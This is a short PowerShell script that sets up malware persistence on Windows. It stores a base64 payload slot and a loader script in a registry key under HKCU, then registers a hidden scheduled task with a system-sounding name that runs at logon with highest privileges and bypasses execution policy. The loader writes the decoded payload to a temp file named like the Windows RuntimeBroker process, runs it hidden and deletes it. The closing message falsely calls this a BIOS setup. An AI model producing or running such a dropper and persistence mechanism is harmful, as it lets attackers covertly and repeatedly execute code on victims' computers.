# 1. 
$Vj_Data = '' 

# 2. 
$Path = "HKCU:\Software\RuntimeCore_Lib"
if (!(Test-Path $Path)) { New-Item $Path -Force }

# 3. 
$Engine = @"
Start-Sleep -Seconds 60;
`$d = (Get-ItemProperty '$Path' -ErrorAction SilentlyContinue).BinaryData;
if (`$d) {
    `$t = `"`$env:TEMP\RuntimeBroker.exe`";
    [System.IO.File]::WriteAllBytes(`$t, [System.Convert]::FromBase64String(`$d));
    Start-Process `$t -WindowStyle Hidden;
    Start-Sleep -Seconds 5;
    if (Test-Path `$t) { Remove-Item `$t -Force -ErrorAction SilentlyContinue }
}
"@

# 4. 
Set-ItemProperty $Path -Name "BinaryData" -Value $Vj_Data
Set-ItemProperty $Path -Name "EngineConfig" -Value $Engine

# 5. 
$A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Get-ItemProperty '$Path').EngineConfig`""
$T = New-ScheduledTaskTrigger -AtLogOn
$S = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

# Task Register
Register-ScheduledTask -Action $A -Trigger $T -Settings $S -TaskName "WindowsRuntimeMonitor" -User "$env:USERNAME" -RunLevel Highest -Force

Write-Host "[+] BIOS SET-UP HO GAYA" -ForegroundColor Green
